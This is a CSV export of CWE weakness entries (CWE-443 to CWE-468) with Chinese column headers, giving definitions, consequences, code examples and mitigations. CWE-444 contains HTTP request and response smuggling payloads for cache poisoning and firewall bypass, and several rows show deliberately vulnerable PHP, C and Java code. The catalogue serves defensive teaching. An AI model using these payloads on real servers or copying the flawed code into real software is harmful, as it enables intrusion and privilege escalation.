cwe_vulnerabilities
名称,定义,常见后果,示范例子,可能的缓解方案
CWE CATEGORY: DEPRECATED: Web Problems,"This entry has been deprecated. It was originally used for organizing the Development View (CWE-699) and some other views, but it introduced unnecessary complexity and depth to the resulting tree.",无常见后果信息,无示范例子,无可能的缓解方案
CWE-443: DEPRECATED: HTTP response splitting,This weakness can be found atCWE-113.,无常见后果信息,无示范例子,无可能的缓解方案
CWE-444: Inconsistent Interpretation of HTTP Requests ('HTTP Request/Response Smuggling'),"The product acts as an intermediary HTTP agent (such as a proxy or firewall) in the data flow between two entities such as a client and server, but it does not interpret malformed HTTP requests or responses in ways that are consistent with how the messages will be processed by those entities that are at the ultimate destination.","Scope: IntegrityNon-RepudiationAccess Control, Impact: Technical Impact:Unexpected State; Hide Activities; Bypass Protection MechanismAn attacker could create HTTP messages to exploit a number of weaknesses including 1) the message can trick the web server to associate a URL with another URL's webpage and caching the contents of the webpage (web cache poisoning attack), 2) the message can be structured to bypass the firewall protection mechanisms and gain unauthorized access to a web application, and 3) the message can invoke a script or a page that returns client credentials (similar to a Cross Site Scripting attack)., Likelihood:","Example 1In the following example, a malformed HTTP request is sent to a website that includes a proxy server and a web server with the intent of poisoning the cache to associate one webpage with another malicious webpage.(attack code)POST http://www.website.com/foobar.html HTTP/1.1Host: www.website.comConnection: Keep-AliveContent-Type: application/x-www-form-urlencodedContent-Length: 0Content-Length: 54GET /poison.html HTTP/1.1Host: www.website.comBla: GET http://www.website.com/page_to_poison.html HTTP/1.1Host: www.website.comConnection: Keep-AliveWhen this request is sent to the proxy server, the proxy server parses the first four lines of the POST request and encounters the two ""Content-Length"" headers. The proxy server ignores the first header, so it assumes the request has a body of length 54 bytes. Therefore, it treats the data in the next three lines that contain exactly 54 bytes as the first request's body:(result)GET /poison.html HTTP/1.1Host: www.website.comBla:The proxy then parses the remaining bytes, which it treats as the client's second request:(attack code)GET http://www.website.com/page_to_poison.html HTTP/1.1Host: www.website.comConnection: Keep-AliveThe original request is forwarded by the proxy server to the web server. Unlike the proxy, the web server uses the first ""Content-Length"" header and considers that the first POST request has no body.(attack code)POST http://www.website.com/foobar.html HTTP/1.1Host: www.website.comConnection: Keep-AliveContent-Type: application/x-www-form-urlencodedContent-Length: 0Content-Length: 54 (ignored by server)Because the web server has assumed the original POST request was length 0, it parses the second request that follows, i.e. for GET /poison.html:(attack code)GET /poison.html HTTP/1.1Host: www.website.comBla: GET http://www.website.com/page_to_poison.html HTTP/1.1Host: www.website.comConnection: Keep-AliveNote that the ""Bla:"" header is treated as a regular header, so it is not parsed as a separate GET request.The requests the web server sees are ""POST /foobar.html"" and ""GET /poison.html"", so it sends back two responses with the contents of the ""foobar.html"" page and the ""poison.html"" page, respectively. The proxy matches these responses to the two requests it thinks were sent by the client - ""POST /foobar.html"" and ""GET /page_to_poison.html"". If the response is cacheable, the proxy caches the contents of ""poison.html"" under the URL ""page_to_poison.html"", and the cache is poisoned! Any client requesting ""page_to_poison.html"" from the proxy would receive the ""poison.html"" page.When a website includes both a proxy server and a web server, some protection against this type of attack can be achieved by installing a web application firewall, or using a web server that includes a stricter HTTP parsing procedure or make all webpages non-cacheable.Additionally, if a web application includes a Java servlet for processing requests, the servlet can check for multiple ""Content-Length"" headers and if they are found the servlet can return an error response thereby preventing the poison page to be cached, as shown below.(good code)Example Language:Javaprotected void processRequest(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {// Set up response writer object...try {// check for multiple content length headersEnumeration contentLengthHeaders = request.getHeaders(""Content-Length"");int count = 0;while (contentLengthHeaders.hasMoreElements()) {count++;}if (count > 1) {// output error response}else {// process request}} catch (Exception ex) {...}}Example 2In the following example, a malformed HTTP request is sent to a website that includes a web server with a firewall with the intent of bypassing the web server firewall to smuggle malicious code into the system.(attack code)POST /page.asp HTTP/1.1Host: www.website.comConnection: Keep-AliveContent-Length: 49223zzz...zzz [""z"" x 49152]POST /page.asp HTTP/1.0Connection: Keep-AliveContent-Length: 30POST /page.asp HTTP/1.0Bla: POST /page.asp?cmd.exe HTTP/1.0Connection: Keep-AliveWhen this request is sent to the web server, the first POST request has a content-length of 49,223 bytes, and the firewall treats the line with 49,152 copies of ""z"" and the lines with an additional lines with 71 bytes as its body (49,152+71=49,223). The firewall then continues to parse what it thinks is the second request starting with the line with the third POST request.Note that there is no CRLF after the ""Bla: "" header so the POST in the line is parsed as the value of the ""Bla:"" header. Although the line contains the pattern identified with a worm (""cmd.exe""), it is not blocked, since it is considered part of a header value. Therefore, ""cmd.exe"" is smuggled through the firewall.When the request is passed through the firewall the web server the first request is ignored because the web server does not find an expected ""Content-Type: application/x-www-form-urlencoded"" header, and starts parsing the second request.This second request has a content-length of 30 bytes, which is exactly the length of the next two lines up to the space after the ""Bla:"" header. And unlike the firewall, the web server processes the final POST as a separate third request and the ""cmd.exe"" worm is smuggled through the firewall to the web server.To avoid this attack a Web server firewall product must be used that is designed to prevent this type of attack.Example 3The interpretation of HTTP responses can be manipulated if response headers include a space between the header name and colon, or if HTTP 1.1 headers are sent through a proxy configured for HTTP 1.0, allowing for HTTP response smuggling. This can be exploited in web browsers and other applications when used in combination with various proxy servers. For instance, the HTTP response interpreted by the front-end/client HTTP agent/entity - in this case the web browser - can interpret a single response from an adversary-compromised web server as being two responses from two different web sites. In the Example below, notice the extra space after the Content-Length and Set-Cookie headers.(attack code)HTTP/1.1 200 OKDate: Fri, 08 Aug 2016 08:12:31 GMTServer: Apache (Unix)Connection: Keep-AliveContent-Encoding: gzipContent-Type: text/htmlContent-Length :2345Transfer-Encoding: chunkedSet-Cookie :token=""Malicious Code""<HTML> ... ""Malicious Code""","Phase:  ImplementationUse a web server that employs a strict HTTP parsing procedure, such as Apache [REF-433].Phase:  ImplementationUse only SSL communication.Phase:  ImplementationTerminate the client session after each request.Phase:  System ConfigurationTurn all pages to non-cacheable."
CWE CATEGORY: DEPRECATED: User Interface Errors,This weakness has been deprecated because it was a duplicate ofCWE-355. All content has been transferred toCWE-355.,无常见后果信息,无示范例子,无可能的缓解方案
CWE-446: UI Discrepancy for Security Feature,"The user interface does not correctly enable or configure a security feature, but the interface provides feedback that causes the user to believe that the feature is in a secure state.","Scope: Other, Impact: Technical Impact:Varies by Context, Likelihood: ",无示范例子,无可能的缓解方案
CWE-447: Unimplemented or Unsupported Feature in UI,"A UI function for a security feature appears to be supported and gives feedback to the user that suggests that it is supported, but the underlying functionality is not implemented.","Scope: Other, Impact: Technical Impact:Varies by Context, Likelihood: ",无示范例子,Phase:  TestingPerform functionality testing before deploying the application.
CWE-448: Obsolete Feature in UI,A UI function is obsolete and the product does not warn the user.,"Scope: Other, Impact: Technical Impact:Quality Degradation; Varies by Context, Likelihood: ",无示范例子,Phase:  Architecture and DesignRemove the obsolete feature from the UI. Warn the user that the feature is no longer supported.
CWE-449: The UI Performs the Wrong Action,The UI performs the wrong action with respect to the user's request.,"Scope: Other, Impact: Technical Impact:Quality Degradation; Varies by Context, Likelihood: ",无示范例子,Phase:  TestingPerform extensive functionality testing of the UI. The UI should behave as specified.
CWE-450: Multiple Interpretations of UI Input,The UI has multiple interpretations of user input but does not prompt the user when it selects the less secure interpretation.,"Scope: Other, Impact: Technical Impact:Varies by Context, Likelihood: ",无示范例子,"Phase:  ImplementationStrategy:  Input ValidationAssume all input is malicious. Use an ""accept known good"" input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, ""boat"" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as ""red"" or ""blue.""Do not rely exclusively on looking for malicious or malformed inputs. This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.Phase:  ImplementationStrategy:  Input ValidationInputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180). Make sure that the application does not decode the same input twice (CWE-174). Such errors could be used to bypass allowlist validation schemes by introducing dangerous inputs after they have been checked."
CWE-451: User Interface (UI) Misrepresentation of Critical Information,"The user interface (UI) does not properly represent critical information to the user, allowing the information - or its source - to be obscured or spoofed. This is often a component in phishing attacks.","Scope: Non-RepudiationAccess Control, Impact: Technical Impact:Hide Activities; Bypass Protection Mechanism, Likelihood: ",无示范例子,"Phase:  ImplementationStrategy:  Input ValidationPerform data validation (e.g. syntax, length, etc.) before interpreting the data.Phase:  Architecture and DesignStrategy:  Output EncodingCreate a strategy for presenting information, and plan for how to display unusual characters."
CWE CATEGORY: Initialization and Cleanup Errors,Weaknesses in this category occur in behaviors that are used for initialization and breakdown.,无常见后果信息,无示范例子,无可能的缓解方案
CWE-453: Insecure Default Variable Initialization,"The product, by default, initializes an internal variable with an insecure or less secure value than is possible.","Scope: Integrity, Impact: Technical Impact:Modify Application DataAn attacker could gain access to and modify sensitive data or system information., Likelihood: ","Example 1This code attempts to login a user using credentials from a POST request:(bad code)Example Language:PHP// $user and $pass automatically set from POST requestif (login_user($user,$pass)) {$authorized = true;}...if ($authorized) {generatePage();}Because the $authorized variable is never initialized, PHP will automatically set $authorized to any value included in the POST request if register_globals is enabled. An attacker can send a POST request with an unexpected third value 'authorized' set to 'true' and gain authorized status without supplying valid credentials.Here is a fixed version:(good code)Example Language:PHP$user = $_POST['user'];$pass = $_POST['pass'];$authorized = false;if (login_user($user,$pass)) {$authorized = true;}...This code avoids the issue by initializing the $authorized variable to false and explicitly retrieving the login credentials from the $_POST variable. Regardless, register_globals should never be enabled and is disabled by default in current versions of PHP.","Phase:  System ConfigurationDisable or change default settings when they can be used to abuse the system. Since those default settings are shipped with the product they are likely to be known by a potential attacker who is familiar with the product. For instance, default credentials should be changed or the associated accounts should be disabled."
CWE-454: External Initialization of Trusted Variables or Data Stores,The product initializes critical internal variables or data stores using inputs that can be modified by untrusted actors.,"Scope: Integrity, Impact: Technical Impact:Modify Application DataAn attacker could gain access to and modify sensitive data or system information., Likelihood: ","Example 1In the Java example below, a system property controls the debug level of the application.(bad code)Example Language:Javaint debugLevel = Integer.getInteger(""com.domain.application.debugLevel"").intValue();If an attacker is able to modify the system property, then it may be possible to coax the application into divulging sensitive information by virtue of the fact that additional debug information is printed/exposed as the debug level increases.Example 2This code checks the HTTP POST request for a debug switch, and enables a debug mode if the switch is set.(bad code)Example Language:PHP$debugEnabled = false;if ($_POST[""debug""] == ""true""){$debugEnabled = true;}/.../function login($username, $password){if($debugEnabled){echo 'Debug Activated';phpinfo();$isAdmin = True;return True;}}Any user can activate the debug mode, gaining administrator privileges. An attacker may also use the information printed by the phpinfo() function to further exploit the system. .This example also exhibits Information Exposure Through Debug Information (CWE-215)","Phase:  ImplementationStrategy:  Input ValidationA product system should be reluctant to trust variables that have been initialized outside of its trust boundary. Ensure adequate checking (e.g. input validation) is performed when relying on input from outside a trust boundary.Phase:  Architecture and DesignAvoid any external control of variables. If necessary, restrict the variables that can be modified using an allowlist, and use a different namespace or naming convention if possible."
CWE-455: Non-exit on Failed Initialization,"The product does not exit or otherwise modify its operation when security-relevant errors occur during initialization, such as when a configuration file has a format error or a hardware security module (HSM) cannot be activated, which can cause the product to execute in a less secure fashion than intended by the administrator.","Scope: IntegrityOther, Impact: Technical Impact:Modify Application Data; Alter Execution LogicThe application could be placed in an insecure state that may allow an attacker to modify sensitive data or allow unintended logic to be executed., Likelihood: ","Example 1The following code intends to limit certain operations to the administrator only.(bad code)Example Language:Perl$username = GetCurrentUser();$state = GetStateData($username);if (defined($state)) {$uid = ExtractUserID($state);}# do stuffif ($uid == 0) {DoAdminThings();}If the application is unable to extract the state information - say, due to a database timeout - then the $uid variable will not be explicitly set by the programmer. This will cause $uid to be regarded as equivalent to ""0"" in the conditional, allowing the original user to perform administrator actions. Even if the attacker cannot directly influence the state data, unexpected errors could cause incorrect privileges to be assigned to a user just by accident.",Phase:  ImplementationFollow the principle of failing securely when an error occurs. The system should enter a state where it is not vulnerable and will not display sensitive error messages to a potential attacker.
CWE-456: Missing Initialization of a Variable,"The product does not initialize critical variables, which causes the execution environment to use unexpected values.","Scope: IntegrityOther, Impact: Technical Impact:Unexpected State; Quality Degradation; Varies by ContextThe uninitialized data may be invalid, causing logic errors within the program. In some cases, this could result in a security problem., Likelihood: ","Example 1This function attempts to extract a pair of numbers from a user-supplied string.(bad code)Example Language:Cvoid parse_data(char *untrusted_input){int m, n, error;error = sscanf(untrusted_input, ""%d:%d"", &m, &n);if ( EOF == error ){die(""Did not specify integer value. Die evil hacker!\n"");}/* proceed assuming n and m are initialized correctly */}This code attempts to extract two integer values out of a formatted, user-supplied input. However, if an attacker were to provide an input of the form:(attack code)123:then only the m variable will be initialized. Subsequent use of n may result in the use of an uninitialized variable (CWE-457).Example 2Here, an uninitialized field in a Java class is used in a seldom-called method, which would cause a NullPointerException to be thrown.(bad code)Example Language:Javaprivate User user;public void someMethod() {// Do something interesting....// Throws NPE if user hasn't been properly initialized.String username = user.getName();}Example 3This code first authenticates a user, then allows a delete command if the user is an administrator.(bad code)Example Language:PHPif (authenticate($username,$password) && setAdmin($username)){$isAdmin = true;}/.../if ($isAdmin){deleteUser($userToDelete);}The $isAdmin variable is set to true if the user is an admin, but is uninitialized otherwise. If PHP's register_globals feature is enabled, an attacker can set uninitialized variables like $isAdmin to arbitrary values, in this case gaining administrator privileges by setting $isAdmin to true.Example 4In the following Java code the BankManager class uses the user variable of the class User to allow authorized users to perform bank manager tasks. The user variable is initialized within the method setUser that retrieves the User from the User database. The user is then authenticated as unauthorized user through the method authenticateUser.(bad code)Example Language:Javapublic class BankManager {// user allowed to perform bank manager tasksprivate User user = null;private boolean isUserAuthentic = false;// constructor for BankManager classpublic BankManager() {...}// retrieve user from database of userspublic User getUserFromUserDatabase(String username){...}// set user variable using usernamepublic void setUser(String username) {this.user = getUserFromUserDatabase(username);}// authenticate userpublic boolean authenticateUser(String username, String password) {if (username.equals(user.getUsername()) && password.equals(user.getPassword())) {isUserAuthentic = true;}return isUserAuthentic;}// methods for performing bank manager tasks...}However, if the method setUser is not called before authenticateUser then the user variable will not have been initialized and will result in a NullPointerException. The code should verify that the user variable has been initialized before it is used, as in the following code.(good code)Example Language:Javapublic class BankManager {// user allowed to perform bank manager tasksprivate User user = null;private boolean isUserAuthentic = false;// constructor for BankManager classpublic BankManager(String username) {user = getUserFromUserDatabase(username);}// retrieve user from database of userspublic User getUserFromUserDatabase(String username) {...}// authenticate userpublic boolean authenticateUser(String username, String password) {if (user == null) {System.out.println(""Cannot find user "" + username);}else {if (password.equals(user.getPassword())) {isUserAuthentic = true;}}return isUserAuthentic;}// methods for performing bank manager tasks...}Example 5This example will leave test_string in an unknown condition when i is the same value as err_val, because test_string is not initialized (CWE-456). Depending on where this code segment appears (e.g. within a function body), test_string might be random if it is stored on the heap or stack. If the variable is declared in static memory, it might be zero or NULL. Compiler optimization might contribute to the unpredictability of this address.(bad code)Example Language:Cchar *test_string;if (i != err_val){test_string = ""Hello World!"";}printf(""%s"", test_string);When the printf() is reached, test_string might be an unexpected address, so the printf might print junk strings (CWE-457).To fix this code, there are a couple approaches to
			  making sure that test_string has been properly set once
			  it reaches the printf().One solution would be to set test_string to an
			  acceptable default before the conditional:(good code)Example Language:Cchar *test_string = ""Done at the beginning"";if (i != err_val){test_string = ""Hello World!"";}printf(""%s"", test_string);Another solution is to ensure that each
			  branch of the conditional - including the default/else
			  branch - could ensure that test_string is set:(good code)Example Language:Cchar *test_string;if (i != err_val){test_string = ""Hello World!"";}else {test_string = ""Done on the other side!"";}printf(""%s"", test_string);",Phase:  ImplementationCheck that critical variables are initialized.Phase:  TestingUse a static analysis tool to spot non-initialized variables.
CWE-457: Use of Uninitialized Variable,"The code uses a variable that has not been initialized, leading to unpredictable or unintended results.","Scope: AvailabilityIntegrityOther, Impact: Technical Impact:OtherInitial variables usually contain junk, which can not be trusted for consistency. This can lead to denial of service conditions, or modify control flow in unexpected ways. In some cases, an attacker can ""pre-initialize"" the variable using previous actions, which might enable code execution. This can cause a race condition if a lock variable check passes when it should not., Likelihood: ; Scope: AuthorizationOther, Impact: Technical Impact:OtherStrings that are not initialized are especially dangerous, since many functions expect a null at the end -- and only at the end -- of a string., Likelihood: ","Example 1This code prints a greeting using information stored in a POST request:(bad code)Example Language:PHPif (isset($_POST['names'])) {$nameArray = $_POST['names'];}echo ""Hello "" . $nameArray['first'];This code checks if the POST array 'names' is set before assigning it to the $nameArray variable. However, if the array is not in the POST request, $nameArray will remain uninitialized. This will cause an error when the array is accessed to print the greeting message, which could lead to further exploit.Example 2The following switch statement is intended to set the values of the variables aN and bN before they are used:(bad code)Example Language:Cint aN, Bn;switch (ctl) {case -1:aN = 0;bN = 0;break;case 0:aN = i;bN = -i;break;case 1:aN = i + NEXT_SZ;bN = i - NEXT_SZ;break;default:aN = -1;aN = -1;break;}repaint(aN, bN);In the default case of the switch statement, the programmer has accidentally set the value of aN twice. As a result, bN will have an undefined value. Most uninitialized variable issues result in general software reliability problems, but if attackers can intentionally trigger the use of an uninitialized variable, they might be able to launch a denial of service attack by crashing the program. Under the right circumstances, an attacker may be able to control the value of an uninitialized variable by affecting the values on the stack prior to the invocation of the function.Example 3This example will leave test_string in an unknown condition when i is the same value as err_val, because test_string is not initialized (CWE-456). Depending on where this code segment appears (e.g. within a function body), test_string might be random if it is stored on the heap or stack. If the variable is declared in static memory, it might be zero or NULL. Compiler optimization might contribute to the unpredictability of this address.(bad code)Example Language:Cchar *test_string;if (i != err_val){test_string = ""Hello World!"";}printf(""%s"", test_string);When the printf() is reached, test_string might be an unexpected address, so the printf might print junk strings (CWE-457).To fix this code, there are a couple approaches to
			  making sure that test_string has been properly set once
			  it reaches the printf().One solution would be to set test_string to an
			  acceptable default before the conditional:(good code)Example Language:Cchar *test_string = ""Done at the beginning"";if (i != err_val){test_string = ""Hello World!"";}printf(""%s"", test_string);Another solution is to ensure that each
			  branch of the conditional - including the default/else
			  branch - could ensure that test_string is set:(good code)Example Language:Cchar *test_string;if (i != err_val){test_string = ""Hello World!"";}else {test_string = ""Done on the other side!"";}printf(""%s"", test_string);","Phase:  ImplementationStrategy:  Attack Surface ReductionAssign all variables to an initial value.Phase:  Build and CompilationStrategy:  Compilation or Build HardeningMost compilers will complain about the use of uninitialized variables if warnings are turned on.Phases:  Implementation; OperationWhen using a language that does not require explicit declaration of variables, run or compile the software in a mode that reports undeclared or unknown variables. This may indicate the presence of a typographic error in the variable's name.Phase:  RequirementsThe choice could be made to use a language that is not susceptible to these issues.Phase:  Architecture and DesignMitigating technologies such as safe string libraries and container abstractions could be introduced."
CWE-458: DEPRECATED: Incorrect Initialization,"This weakness has been deprecated because its name and description did not match. The description duplicatedCWE-454, while the name suggested a more abstract initialization problem. Please refer toCWE-665for the more abstract problem.",无常见后果信息,无示范例子,无可能的缓解方案
CWE-459: Incomplete Cleanup,"The product does not properly ""clean up"" and remove temporary or supporting resources after they have been used.","Scope: OtherConfidentialityIntegrity, Impact: Technical Impact:Other; Read Application Data; Modify Application Data; DoS: Resource Consumption (Other)It is possible to overflow the number of temporary files because directories typically have limits on the number of files allowed. This could create a denial of service problem., Likelihood: ","Example 1Stream resources in a Java application should be released in a finally block, otherwise an exception thrown before the call to close() would result in an unreleased I/O resource. In the example below, the close() method is called in the try block (incorrect).(bad code)Example Language:Javatry {InputStream is = new FileInputStream(path);byte b[] = new byte[is.available()];is.read(b);is.close();} catch (Throwable t) {log.error(""Something bad happened: "" + t.getMessage());}",Phases:  Architecture and Design; ImplementationTemporary files and other supporting resources should be deleted/released immediately after they are no longer needed.
CWE-460: Improper Cleanup on Thrown Exception,"The product does not clean up its state or incorrectly cleans up its state when an exception is thrown, leading to unexpected state or control flow.","Scope: Other, Impact: Technical Impact:Varies by ContextThe code could be left in a bad state., Likelihood: ","Example 1The following example demonstrates the weakness.(bad code)Example Language:Javapublic class foo {public static final void main( String args[] ) {boolean returnValue;returnValue=doStuff();}public static final boolean doStuff( ) {boolean threadLock;boolean truthvalue=true;try {while(//check some condition) {threadLock=true; //do some stuff to truthvaluethreadLock=false;}}catch (Exception e){System.err.println(""You did something bad"");if (something) return truthvalue;}return truthvalue;}}In this case, a thread might be left locked accidentally.","Phase:  ImplementationIf one breaks from a loop or function by throwing an exception, make sure that cleanup happens or that you should exit the program. Use throwing exceptions sparsely."
CWE CATEGORY: DEPRECATED: Data Structure Issues,"This entry has been deprecated. It was originally used for organizing the Development View (CWE-699) and some other views, but it introduced unnecessary complexity and depth to the resulting tree.",无常见后果信息,无示范例子,无可能的缓解方案
CWE-462: Duplicate Key in Associative List (Alist),Duplicate keys in associative lists can lead to non-unique keys being mistaken for an error.,"Scope: Other, Impact: Technical Impact:Quality Degradation; Varies by Context, Likelihood: ","Example 1The following code adds data to a list and then attempts to sort the data.(bad code)Example Language:Pythonalist = []while (foo()): #now assume there is a string data with a key basenamequeue.append(basename,data)queue.sort()Since basename is not necessarily unique, this may not sort how one would like it to be.",Phase:  Architecture and DesignUse a hash table instead of an alist.Phase:  Architecture and DesignUse an alist which checks the uniqueness of hash keys with each entry before inserting the entry.
CWE-463: Deletion of Data Structure Sentinel,The accidental deletion of a data-structure sentinel can cause serious programming logic problems.,"Scope: AvailabilityOther, Impact: Technical Impact:OtherGenerally this error will cause the data structure to not work properly., Likelihood: ; Scope: AuthorizationOther, Impact: Technical Impact:OtherIf a control character, such as NULL is removed, one may cause resource access control problems., Likelihood: ","Example 1This example creates a null terminated string and prints it contents.(bad code)Example Language:Cchar *foo;int counter;foo=calloc(sizeof(char)*10);for (counter=0;counter!=10;counter++) {foo[counter]='a';printf(""%s\n"",foo);}The string foo has space for 9 characters and a null terminator, but 10 characters are written to it. As a result, the string foo is not null terminated and calling printf() on it will have unpredictable and possibly dangerous results.","Phase:  Architecture and DesignUse an abstraction library to abstract away risky APIs. Not a complete solution.Phase:  Build and CompilationStrategy:  Compilation or Build HardeningRun or compile the software using features or extensions that automatically provide a protection mechanism that mitigates or eliminates buffer overflows.For example, certain compilers and extensions provide automatic buffer overflow detection mechanisms that are built into the compiled code. Examples include the Microsoft Visual Studio /GS flag, Fedora/Red Hat FORTIFY_SOURCE GCC flag, StackGuard, and ProPolice.Effectiveness: Defense in DepthNote:This is not necessarily a complete solution, since these mechanisms can only detect certain types of overflows. In addition, an attack could still cause a denial of service, since the typical response is to exit the application.Phase:  OperationUse OS-level preventative functionality. Not a complete solution."
CWE-464: Addition of Data Structure Sentinel,The accidental addition of a data-structure sentinel can cause serious programming logic problems.,"Scope: Integrity, Impact: Technical Impact:Modify Application DataGenerally this error will cause the data structure to not work properly by truncating the data., Likelihood: ","Example 1The following example assigns some character values to a list of characters and prints them each individually, and then as a string. The third character value is intended to be an integer taken from user input and converted to an int.(bad code)Example Language:Cchar *foo;foo=malloc(sizeof(char)*5);foo[0]='a';foo[1]='a';foo[2]=atoi(getc(stdin));foo[3]='c';foo[4]='\0'printf(""%c %c %c %c %c \n"",foo[0],foo[1],foo[2],foo[3],foo[4]);printf(""%s\n"",foo);The first print statement will print each character separated by a space. However, if a non-integer is read from stdin by getc, then atoi will not make a conversion and return 0. When foo is printed as a string, the 0 at character foo[2] will act as a NULL terminator and foo[3] will never be printed.","Phases:  Implementation; Architecture and DesignEncapsulate the user from interacting with data sentinels. Validate user input to verify that sentinels are not present.Phase:  ImplementationProper error checking can reduce the risk of inadvertently introducing sentinel values into data. For example, if a parsing function fails or encounters an error, it might return a value that is the same as the sentinel.Phase:  Architecture and DesignUse an abstraction library to abstract away risky APIs. This is not a complete solution.Phase:  OperationUse OS-level preventative functionality. This is not a complete solution."
CWE CATEGORY: Pointer Issues,Weaknesses in this category are related to improper handling of pointers.,无常见后果信息,无示范例子,无可能的缓解方案
CWE-466: Return of Pointer Value Outside of Expected Range,A function can return a pointer to memory that is outside of the buffer that the pointer is expected to reference.,"Scope: ConfidentialityIntegrity, Impact: Technical Impact:Read Memory; Modify Memory, Likelihood: ",无示范例子,无可能的缓解方案
CWE-467: Use of sizeof() on a Pointer Type,"The code calls sizeof() on a malloced pointer type, which always returns the wordsize/8. This can produce an unexpected result if the programmer intended to determine how much memory has been allocated.","Scope: IntegrityConfidentiality, Impact: Technical Impact:Modify Memory; Read MemoryThis error can often cause one to allocate a buffer that is much smaller than what is needed, leading to resultant weaknesses such as buffer overflows., Likelihood: ","Example 1Care should be taken to ensure sizeof returns the size of the data structure itself, and not the size of the pointer to the data structure.In this example, sizeof(foo) returns the size of the pointer.(bad code)Example Language:Cdouble *foo;...foo = (double *)malloc(sizeof(foo));In this example, sizeof(*foo) returns the size of the data structure and not the size of the pointer.(good code)Example Language:Cdouble *foo;...foo = (double *)malloc(sizeof(*foo));Example 2This example defines a fixed username and password. The AuthenticateUser() function is intended to accept a username and a password from an untrusted user, and check to ensure that it matches the username and password. If the username and password match, AuthenticateUser() is intended to indicate that authentication succeeded.(bad code)/* IgnoreCWE-259(hard-coded password) andCWE-309(use of password system for authentication) for this example. */char *username = ""admin"";char *pass = ""password"";int AuthenticateUser(char *inUser, char *inPass) {printf(""Sizeof username = %d\n"", sizeof(username));printf(""Sizeof pass = %d\n"", sizeof(pass));if (strncmp(username, inUser, sizeof(username))) {printf(""Auth failure of username using sizeof\n"");return(AUTH_FAIL);}/* Because ofCWE-467, the sizeof returns 4 on many platforms and architectures. */if (! strncmp(pass, inPass, sizeof(pass))) {printf(""Auth success of password using sizeof\n"");return(AUTH_SUCCESS);}else {printf(""Auth fail of password using sizeof\n"");return(AUTH_FAIL);}}int main (int argc, char **argv){int authResult;if (argc < 3) {ExitError(""Usage: Provide a username and password"");}authResult = AuthenticateUser(argv[1], argv[2]);if (authResult != AUTH_SUCCESS) {ExitError(""Authentication failed"");}else {DoAuthenticatedTask(argv[1]);}}In AuthenticateUser(), because sizeof() is applied to a parameter with an array type, the sizeof() call might return 4 on many modern architectures. As a result, the strncmp() call only checks the first four characters of the input password, resulting in a partial comparison (CWE-187), leading to improper authentication (CWE-287).Because of the partial comparison, any of these passwords would still cause authentication to succeed for the ""admin"" user:(attack code)pass5passABCDEFGHpassWORDBecause only 4 characters are checked, this significantly reduces the search space for an attacker, making brute force attacks more feasible.The same problem also applies to the username, so values such as ""adminXYZ"" and ""administrator"" will succeed for the username.","Phase:  ImplementationUse expressions such as ""sizeof(*pointer)"" instead of ""sizeof(pointer)"", unless you intend to run sizeof() on a pointer type to gain some platform independence or if you are allocating a variable on the stack."
CWE-468: Incorrect Pointer Scaling,"In C and C++, one may often accidentally refer to the wrong memory due to the semantics of when math operations are implicitly scaled.","Scope: ConfidentialityIntegrity, Impact: Technical Impact:Read Memory; Modify MemoryIncorrect pointer scaling will often result in buffer overflow conditions. Confidentiality can be compromised if the weakness is in the context of a buffer over-read or under-read., Likelihood: ","Example 1This example attempts to calculate the position of the second byte of a pointer.(bad code)Example Language:Cint *p = x;char * second_char = (char *)(p + 1);In this example, second_char is intended to point to the second byte of p. But, adding 1 to p actually adds sizeof(int) to p, giving a result that is incorrect (3 bytes off on 32-bit platforms). If the resulting memory address is read, this could potentially be an information leak. If it is a write, it could be a security-critical write to unauthorized memory-- whether or not it is a buffer overflow. Note that the above code may also be wrong in other ways, particularly in a little endian environment.",Phase:  Architecture and DesignUse a platform with high-level memory abstractions.Phase:  ImplementationAlways use array indexing instead of direct pointer manipulation.Phase:  Architecture and DesignUse technologies for preventing buffer overflows.
